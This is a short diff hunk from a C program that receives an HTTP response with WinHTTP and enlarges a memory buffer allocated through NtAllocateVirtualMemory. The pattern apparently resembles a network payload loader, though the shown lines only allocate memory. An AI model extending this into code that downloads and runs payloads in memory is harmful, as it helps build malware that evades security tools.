@@ -56,7 +56,7 @@ int main()
         bResults = WinHttpReceiveResponse(hRequest, NULL);
 
     PVOID lpAddress = NULL;
-    SIZE_T sDataSize = 0x40000;
+    SIZE_T sDataSize = 0x60000;
     NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
     DWORD_PTR hptr = (DWORD_PTR)lpAddress;
 
